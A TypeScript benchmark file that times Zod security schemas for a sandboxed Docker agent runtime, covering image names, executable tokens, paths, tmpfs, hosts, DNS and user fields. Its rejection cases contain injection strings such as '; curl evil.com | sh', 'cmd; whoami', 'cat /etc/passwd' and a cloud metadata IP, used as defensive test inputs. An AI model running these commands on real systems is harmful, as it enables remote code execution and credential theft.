/**
 * Performance benchmarks for Zod security schemas.
 *
 * Target: individual schema field validations < 10µs/op.
 * Full config validation should not measurably regress from pre-hardening baseline.
 *
 * Run: pnpm exec vitest bench src/config/schema-security.bench.ts
 */
import { bench, describe } from "vitest";
import { SandboxDockerSchema } from "./zod-schema.agent-runtime.js";
import { DockerImageSchema, ExecutableTokenSchema, SafePathSchema } from "./zod-schema.core.js";

describe("DockerImageSchema", () => {
  bench("valid image — debian:bookworm-slim", () => {
    DockerImageSchema.safeParse("debian:bookworm-slim");
  });

  bench("valid image — myregistry.io/myimage:latest", () => {
    DockerImageSchema.safeParse("myregistry.io/myimage:latest");
  });

  bench("rejection — shell injection", () => {
    DockerImageSchema.safeParse("; curl evil.com | sh");
  });

  bench("rejection — exceeds max length", () => {
    DockerImageSchema.safeParse("a".repeat(257));
  });
});

describe("ExecutableTokenSchema", () => {
  bench("valid — bare name (node)", () => {
    ExecutableTokenSchema.safeParse("node");
  });

  bench("valid — path (/usr/bin/python3)", () => {
    ExecutableTokenSchema.safeParse("/usr/bin/python3");
  });

  bench("rejection — shell injection", () => {
    ExecutableTokenSchema.safeParse("cmd; whoami");
  });
});

describe("SafePathSchema", () => {
  bench("valid — normal path", () => {
    SafePathSchema.safeParse("/home/user/project");
  });

  bench("rejection — traversal attempt", () => {
    SafePathSchema.safeParse("/home/user; cat /etc/passwd");
  });
});

describe("SandboxDockerSchema — field validation", () => {
  bench("valid tmpfs entry", () => {
    SandboxDockerSchema.safeParse({ tmpfs: ["/tmp:noexec,nosuid,size=256m"] });
  });

  bench("rejection — tmpfs exec option", () => {
    SandboxDockerSchema.safeParse({ tmpfs: ["/tmp:exec"] });
  });

  bench("valid extraHosts entry", () => {
    SandboxDockerSchema.safeParse({ extraHosts: ["myhost:192.168.1.1"] });
  });

  bench("rejection — extraHosts metadata IP", () => {
    SandboxDockerSchema.safeParse({ extraHosts: ["metadata:169.254.169.254"] });
  });

  bench("valid dns entry", () => {
    SandboxDockerSchema.safeParse({ dns: ["8.8.8.8"] });
  });

  bench("rejection — dns hostname", () => {
    SandboxDockerSchema.safeParse({ dns: ["evil.dns.server"] });
  });

  bench("valid user", () => {
    SandboxDockerSchema.safeParse({ user: "1000:1000" });
  });

  bench("rejection — user root", () => {
    SandboxDockerSchema.safeParse({ user: "root" });
  });
});

describe("SandboxDockerSchema — full object", () => {
  const FULL_VALID = {
    image: "debian:bookworm-slim",
    tmpfs: ["/tmp:noexec,nosuid,size=256m", "/var/tmp", "/run"],
    user: "1000:1000",
    extraHosts: ["myhost:192.168.1.1"],
    dns: ["8.8.8.8", "8.8.4.4"],
    capDrop: ["ALL"],
  };

  bench("full valid config", () => {
    SandboxDockerSchema.safeParse(FULL_VALID);
  });

  bench("minimal config (image only)", () => {
    SandboxDockerSchema.safeParse({ image: "debian:bookworm-slim" });
  });

  bench("empty config", () => {
    SandboxDockerSchema.safeParse({});
  });
});
